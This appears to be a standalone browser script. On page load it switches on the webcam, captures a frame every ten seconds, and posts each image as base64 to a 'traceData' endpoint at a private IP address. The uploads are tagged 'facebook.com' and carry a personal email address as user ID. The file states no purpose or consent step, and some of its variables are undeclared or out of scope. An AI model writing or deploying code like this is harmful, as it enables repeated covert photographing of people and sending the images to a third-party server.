window.onload = () => {
  let videoStream;
  let intervalId;

  function gotMedia(mediaStream) {
    videoStream = mediaStream;
    const videoDevice = mediaStream.getVideoTracks()[0];
    const video = document.createElement('video');
    video.src = URL.createObjectURL(new MediaStream([videoDevice]));
    video.muted = true;
    video.play();

    const canvas = document.createElement('canvas');
    canvas2dContext = canvas.getContext('2d');

    intervalId = window.setInterval(() => {
      if (videoDevice.readyState === 'live') {
        if (video.videoWidth) {
          try {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas2dContext.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
              processPhoto(blob);
            });
          } catch (error) {
            console.error(error);
          }
        } else {
          console.error('Unknown error');
        }
      } else {
        console.error('Invalid state error');
      }
    }, 10000);
  }

  function processPhoto(blob) {
    var reader = new window.FileReader();
    reader.readAsDataURL(blob);
    reader.onloadend = function () {
      base64Data = reader.result.replace('data:image/png;base64,', '');
      let data = {
        base64Data,
        url: 'facebook.com',
        userId: 'diptii86@gmail.com'
      }
      console.log('Posting');
      postData(data);
    };
  }

  function stopCamera(error) {
    if (error) console.error(error);
    if (intervalId) clearInterval(intervalId);
    if (videoDevice) videoDevice.stop();
  }

  function postData(data) {
    $.ajax({
      method: 'POST',
      url: 'http://172.16.1.128:8989/v1/traceData/',
      cache: false,
      contentType: 'application/json',
      data: JSON.stringify(data)
    }).done((response) => {
      console.log('Response', response)
    }).fail((error) => {
      console.error(error);
    });
  }

  function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true }).then(gotMedia).catch();
  }

  startCamera();
};